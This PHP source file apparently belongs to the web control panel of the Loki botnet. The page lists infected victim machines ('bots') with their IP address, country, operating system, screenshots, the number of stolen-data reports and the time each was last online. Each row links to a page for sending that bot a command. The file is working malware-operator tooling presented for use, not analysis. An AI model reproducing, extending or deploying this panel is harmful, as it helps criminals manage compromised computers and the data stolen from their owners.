<?php
		
	$PageSearch = $SearctTXT = $DataTable = NULL;
	
	if(isset($_REQUEST['sc']))
	{
		$cc = NULL;
		if($_SERVER["REQUEST_METHOD"] == "POST")
		{
			$cc = $_REQUEST['sc'];
			$PageSearch = '&sc=' . implode('|', $cc);
		}
		else if(isset($_REQUEST['sc']) && $_SERVER["REQUEST_METHOD"] == "GET")
		{
			$PageSearch = '&sc=' . trim($_REQUEST['sc']);
			$cc = explode("|", $_REQUEST['sc']);
		}
		
		$SearctTXT = array("text", implode(',', $cc), "");
		
		$DataTable = $LokiDBCon->GetBots($StartFrom, $PageLimit, NULL, NULL, NULL, $cc);
	}
	else if(isset($_REQUEST['st']))
	{
		$binid = trim($_REQUEST['st']);
		$SearctTXT = array("text", $binid, "");
		$PageSearch = '&st=' . $binid;
		$DataTable = $LokiDBCon->GetBots($StartFrom, $PageLimit, NULL, NULL, NULL, NULL, NULL, NULL, $binid);
	}
	else
		$DataTable = $LokiDBCon->GetBots($StartFrom, $PageLimit);
			
	$TotalPages = ceil($DataTable["NumOfTotal"] / $PageLimit);
	$ScriptURL = $ScriptURL."?".ACTVALUE_ . "=command";
?>

			<div class="row">
				<div class='col-md-0 sidebar'></div>
				<div class='col-md-12 main'>
				<div align="center" class="">
					<div id="IMGMod" style="padding:10px;" class="modal" tabindex="-1" role="dialog">
						<div class="modal-content">
							<div class="modal-header"> <button type="button" class="close" data-dismiss="modal">&times;</button> <h4 class="modal-title"></h4> </div>
							<div id="modal-body" style="width: 90%;" class="modal-body"></div>
						</div>
					</div>
				</div>
				<?php
					$Disabled 	= (!isset($DataTable["NumOfTotal"]) OR $DataTable["NumOfTotal"] == 0);
					$TableMenu 	= array
					(
						//array($LINK_Delete.$PageSearch, $DeleteTxt, $Disabled),
						//array("onvisible",GetText_('table_show_search', FALSE), $Disabled),
						//array('st', '?'.ACTVALUE_.'='.$Action, $Disabled, 'INPUT'),
						//array(0, GetText_('table_search', FALSE), $Disabled, 'FORMEND')
						$SearctTXT
					);
					GetTableMenu($TableMenu, $ID_ = "table_menu");
				?>
				
				<table class="table-condensed" data-toggle="table" data-toolbar="#table_menu" data-show-columns="true">
					<thead>
						<tr>
							<th data-sortable="false" data-halign="center" data-align="center"><?php GetText_('command_table_bguid'); ?></th>
							<th data-sortable="false" data-halign="center" data-align="center"><?php GetText_('command_table_binid'); ?></th>
							<th data-sortable="true"  data-halign="center" data-align="center"><?php GetText_('report_table_ip'); ?></th>
							<th data-sortable="true"  data-halign="center" data-align="center"><?php GetText_('command_table_pcinfo'); ?></th>
							<th data-sortable="true"  data-halign="center" data-align="center"><?php GetText_('command_table_laston'); ?></th>
							<th data-sortable="true"  data-halign="center" data-align="center"><?php GetText_('settings_admin_new_action'); ?></th>
						</tr>
					</thead>	
					<tbody>
					<?php
						$Counter = 0;
						while($DataTable["NumOfData"] > $Counter)
						{
							$DataImg = '';
							$ScreenIMG = TEMP_ . '/' . $DataTable[$Counter]['bot_guid'] . "_screen.png";
							if(file_exists ($ScreenIMG))
							{
								$DataImg = '<a href="#" id="'.$ScreenIMG.'" class="thumb_img"><img style="margin-top:-2px; margin-left:5px; vertical-align:middle;" height="16" width="16" src="'.INCLUDE_.'/style/icon/screen.png"></a>';
							}
							
							$X_64 	= ($DataTable[$Counter]['bot_is_win64']) ? 'x64' : 'x32';
							$OS__ 	= GetOSText($DataTable[$Counter]['bot_os']);
							
							$ReportTxt = GetText_('table_report_num', FALSE);
							if($DataTable[$Counter]["bot_reports"] > 1)
								$ReportTxt = GetText_('table_report_nums', FALSE);
							
							$ReportLinkTxt = $DataTable[$Counter]["bot_reports"];
							if($DataTable[$Counter]["bot_reports"] > 0)
								$ReportLinkTxt = '<a href="?' . ACTVALUE_ . '=report&st='. $DataTable[$Counter]['bot_guid'].'">' .$DataTable[$Counter]["bot_reports"].'</a>';
							
							print '
								<tr>
									<td><a href="?' . ACTVALUE_ . '=report&st='. $DataTable[$Counter]['bot_guid'].'">'.$DataTable[$Counter]["bot_guid"].'</a></td>
									<td><a href="?' . ACTVALUE_ . '=bot&st='. $DataTable[$Counter]['bot_bin_id'].'">'.$DataTable[$Counter]["bot_bin_id"].'</a></td>
									<td><a href="?' . ACTVALUE_ . '=report&st='. $DataTable[$Counter]["bot_ip"].'">'.$DataTable[$Counter]["bot_ip"].'</a> (<a href="?' . ACTVALUE_ . '=bot&sc='. $DataTable[$Counter]["bot_country"].'">'.$DataTable[$Counter]["bot_country"].'</a>)</td>
									<td>'.stripslashes ($DataTable[$Counter]["bot_name"]).', '.$OS__. " " . $X_64 .', '.$DataTable[$Counter]["bot_screen"].', '.$ReportLinkTxt.' '.$ReportTxt.$DataImg.'</td>
									
									<td>'.NowDate(NULL, $DataTable[$Counter]["bot_last_online"]).' ('.calculate_time_span($DataTable[$Counter]["bot_last_online"]).')</td>
									<td><a href="' .$ScriptURL."&bc=".$DataTable[$Counter]["bot_guid"]. '">'.GetText_('command_table_setcb', 0).'</a></td>
								</tr>';
							$Counter++;
						}
					?>
					</tbody>
				</table>
				
				<?php Pagination($TotalPages, $PageID, $PageLimit, ACTVALUE_, $Action.$PageSearch, $DataTable); ?>
				</div>
				<div class='col-md-1 sidebar'></div>
			</div>
			</div>
		</div>
	</div>
	</body>
</html>
